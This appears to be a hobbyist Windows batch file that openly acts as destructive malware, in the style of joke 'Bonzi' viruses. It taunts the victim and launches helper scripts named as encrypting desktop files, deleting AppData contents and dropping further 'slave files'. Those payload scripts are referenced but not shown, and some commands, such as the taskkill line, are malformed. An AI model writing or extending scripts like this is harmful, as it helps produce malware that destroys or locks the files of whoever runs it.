@echo off
cd assets
echo hello, i have came to destroy all of your files again. but this time, it isnt bonzi. that stupid baboon. this time i woill only make it so that you cant access any more of your made files because they have became my slaves. doesnt that sound wonderful? well, without further adoo, lets get started. first thing i am gonna do is encrypt all of your files on your desktop.
start welcome.vbs
pause
start encrypt.bat
pause
cls
echo well. now i think it is time i actually do some stuff and delete all your pre downloaded files from you.
pause
start appdata delete.bat
pause
msg * ok so i did get a little lazy and stopped with the voice messages...
msg * so now ima just use these message boxes...
msg * you know what, ima just add some other cool slave files to your desktop now...
msg * i wouldnt click any if i where you :)
pause
start fs.bat
timeout /t 5 | findstr "dsfurbogisugb7854gboubgduibfg"
taskkill /f fs.bat
pause
cls